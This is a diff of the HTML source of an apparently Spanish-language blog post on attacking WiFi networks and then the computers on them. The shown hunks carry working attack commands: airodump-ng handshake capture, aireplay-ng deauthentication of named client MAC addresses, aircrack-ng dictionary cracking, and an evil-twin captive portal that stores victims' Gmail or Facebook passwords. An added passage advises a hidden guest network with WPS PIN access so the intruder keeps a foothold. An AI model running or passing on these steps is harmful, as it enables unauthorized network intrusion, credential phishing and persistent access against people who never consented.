@@ -21,7 +21,7 @@ Puede ser que tu tarjeta de red no soporte el tipo de ataque &ldquo;gemelo malva
 sudo wifite sudo airgeddon Primero de todo: Problemas comunes con airgeddon
 Puede ser que tu tarjeta de red no soporte el tipo de ataque &ldquo;gemelo malvado&rdquo; porque tiene que ser capaz de &ldquo;dividir&rdquo; la tarjeta fisica en 2 tarjetas logicas como se explica acá: ¿Qué es VIF? VIF (Interfaz virtual) es la capacidad de dividir una tarjeta física en 2 tarjetas lógicas."><meta itemprop="datePublished" content="2024-07-21T19:48:09-03:00" />
 <meta itemprop="dateModified" content="2024-07-21T19:48:09-03:00" />
-<meta itemprop="wordCount" content="3566">
+<meta itemprop="wordCount" content="3609">
 <meta itemprop="keywords" content="" />
   <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro ellas."/>
 <meta name="twitter:description" content="Bajate BlackArch, KaliLinux o si tenés Arch agregale el repo de BlackArch. Instalá wifite, airgeddon, fluxion.
@@ -809,7 +809,7 @@ sudo airgeddon
 <li>Ahora tenés la opción de capturar el handshake con la opcion 5 o hacer un ataque de gemelo malvado con la opcion 7. Para hacer el ataque del gemelo malvado necesitas capturar el handshake. Si selecionás la opción 7 lo hace todo en uno.</li>
 <li>Vamos a capturar el handshake apretá 5.</li>
 <li>Ponelo en monitor mode con 2 si te olvidaste de hacerlo en el paso anterior.</li>
-<li>Dale a la opcion 5.</li>
+<li>Dale a la opcion 6.</li>
 <li>Ahí comenzará a escanear por redes, cuando veas la red que querés atacar cerrá la ventana con Alt+F4 , ahora los nombres que aparecen en amarillo son las redes que tienen clientes. Seleccioná cual red desees atacar.</li>
 <li>Tenés que elegir el método para desautenticar al cliente, esto es necesario porque solo podemos capturar el handshake cuando el cliente se conecta al wifi, cuando ya está conectado no podemos hacerlo.
 Elegí cualquiera de las 3, el que más me ha funcionado es la 1era opción: <code>deauth / disassoc amok mdk4 attack</code></li>
@@ -1045,7 +1045,7 @@ Ahora intentá ingresar a <code>https://localhost</code></p>
 </span></span></span><span class="line"><span class="cl"><span class="go">service apache2 start
 </span></span></span></code></pre></div><p>Ahora si nos conectamos a nuestra WiFi falsa e ingresamos a gmail, yahoo, o facebook nos va a redirigir a nuestro portal capitativo, en donde la victima ingresará su contraseña y se guardará en <code>/var/www/html/passwords.txt</code></p>
 <p>Podés ejecutar este script para detener el ataque.</p>
-<p>fake-ap-start.sh</p>
+<p>fake-ap-stop.sh</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl">service hostapd stop
@@ -1071,12 +1071,12 @@ Una serie de 4 paquetes intercambiados entre el cliente y el punto de acceso dur
 </span></span><span class="line"><span class="cl">mkdir handshake
 </span></span><span class="line"><span class="cl"><span class="nb">cd</span> handshake
 </span></span></code></pre></div><h3 id="escuchamos-para-capturar-el-handshake">Escuchamos para capturar el handshake</h3>
-<p>airodump-ng wlan1mon &ndash;bssid 1C:5F:2B:E7:77:EA &ndash;channel 11 &ndash;write handshake &ndash;output-format cap</p>
+<p><code>airodump-ng wlan1mon --bssid 1C:5F:2B:E7:77:EA --channel 11 --write handshake --output-format cap</code></p>
 <p>Cuando el handshake es capturado se guardará en el directorio en donde estás situado.</p>
 <h3 id="deautenticamos-a-los-clientes-para-que-se-vuelvan-a-conectar-y-así-capturar-el-handshake">Deautenticamos a los clientes para que se vuelvan a conectar y así capturar el handshake.</h3>
-<p>aireplay-ng &ndash;deauth 0 -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon # donde -a es el SSID y -c es el cliente.</p>
+<p><code>aireplay-ng --deauth 0 -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon # donde -a es el SSID y -c es el cliente.</code></p>
 <h3 id="una-vez-que-capturamos-el-handshake-intentamos-descubrir-la-contraseña-usando-un-diccionario">Una vez que capturamos el handshake, intentamos descubrir la contraseña usando un diccionario.</h3>
-<p>aircrack-ng handshake.cap -w passwords.txt
+<p><code>aircrack-ng handshake.cap -w passwords.txt</code>
 En KaliLinux hay un diccionario muy conocido que se llama rockyou.txt y otros diccionarios que se pueden ver ejecutando el comando <code>wordlists</code>.</p>
 <pre tabindex="0"><code>
 
@@ -1098,6 +1098,8 @@ service network-manager start
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aireplay-ng --deauth <span class="m">0</span> -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon
 </span></span></code></pre></div><p>Ahora ejecutamos nuestro fake-ap-start.sh</p>
 <p>Para detenerlo <code>fake-ap-stop.sh</code> y luego service <code>network-manager start</code></p>
+<h3 id="una-vez-que-conseguimos-el-acceso-a-la-wifi-no-deberíamos-perderlo-más">Una vez que conseguimos el acceso a la wifi, no deberíamos perderlo más.</h3>
+<p>Una técnica para no perder el acceso puede ser levantar una red wifi invitado OCULTA no difundas el SSID (guest network) y habilitar acceso a través de WPS por PIN.</p>
 <h2 id="hackeando-computadoras-una-vez-que-conseguiste-el-acceso">Hackeando computadoras una vez que conseguiste el acceso</h2>
 <p>Una vez que conseguimos el acceso a la WiFi, estaría bueno tener acceso también a las computadoras por si las dudas en un futuro cambian la contraseña. Para ello utilizaremos metasploit.
 Primero hacemos un escaneo de todas las PCs conectadas a esa WiFi con el siguiente comando.</p>
